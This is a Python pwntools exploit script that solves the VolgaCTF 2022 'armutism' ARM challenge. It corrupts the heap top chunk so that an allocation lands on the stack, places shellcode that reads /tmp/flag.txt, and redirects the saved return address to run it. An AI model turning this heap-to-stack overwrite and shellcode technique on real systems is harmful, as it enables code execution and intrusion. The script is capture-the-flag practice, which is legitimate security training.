import sys
import re
import time

import pwn

conn = pwn.remote("armutism.q.2022.volgactf.ru", 41337)
#conn = pwn.remote("localhost", 1337)
#conn = pwn.process("armutism-patched")

#conn = pwn.process(["qemu-arm", "-g", "1234", "./armutism-patched"])

#time.sleep(1)
#io = pwn.remote('127.0.0.1', 1234)

#conn = pwn.gdb.debug("sh", env={})

exe = pwn.ELF("armutism-patched")
pwn.context.binary = exe

pwn.context.log_level = 'debug'

libc = pwn.ELF("./libc.so.0")


# This is at bp-0x10
input_stack_addr = int(conn.readline(), 16)
saved_pc_addr = input_stack_addr+0x10

align_stack = "add sp, #4\n"
shellcode_src = pwn.shellcraft.arm.linux.cat("/tmp/flag.txt")
shellcode = pwn.asm(align_stack+shellcode_src)


# So I want to return a chunk where first is my shellcode, then right at the end is saved_pc
target_addr = saved_pc_addr
payload = pwn.p32(0) + pwn.p32(target_addr+4+4) + shellcode

print(f"{hex(input_stack_addr)=} {hex(saved_pc_addr)=} {hex(target_addr)=}")

# Used when debugging locally to allow debugger connection
# input()
conn.readuntil(b">>>")
conn.sendline(b"1")

# malloc a chunk of perfect size, 9 will get us 36 bytes (which fits exactly)

conn.readuntil(b"Input your size:")
conn.sendline(b"9")

conn.readuntil(b"Input numbers:")
for i in range(9):
    conn.sendline(b"0")

# Then, we overwrite the free chunk after us so that it _thinks_ that there's a ton of space left
conn.sendline(f"{0xffffffff}")

# Now we can allocate a huge chunk, which will not itself point to the stack
# Note that we need to divide by 4, and that it won't ask us for input
# Might need to debug this to see if it's the same on the target
last_heap_chunk = 0x22030

diff = (target_addr - last_heap_chunk - 4) & 0xffffffff

assert(diff > 100)

# The -4 is to account for the heap header info
request_size = int((diff - 4) / 4)
print(f"{hex(diff)=} {hex(request_size)=}")

conn.readuntil(b">>>")
conn.sendline(b"1")

conn.readuntil(b"Input your size:")
conn.sendline(f"{request_size}")

# Now we can allocate a small chunk, which should be on the stack
# Then we can write our shellcode on the stack, and change saved ip to point there!
conn.readuntil(b">>>")
conn.sendline(b"1")

payload_int_size = int(len(payload)/4)
conn.readuntil(b"Input your size:")
conn.sendline(f"{payload_int_size}")

conn.readuntil(b"Input numbers:")

for i in range(0, len(payload), 4):
    p = pwn.u32(payload[i:i+4])
    conn.sendline(f"{p}")

# Need to send one more because of the overflow
conn.sendline(b"0")

# now trigger the return
conn.readuntil(b">>>")
conn.sendline(b"2")


conn.interactive()

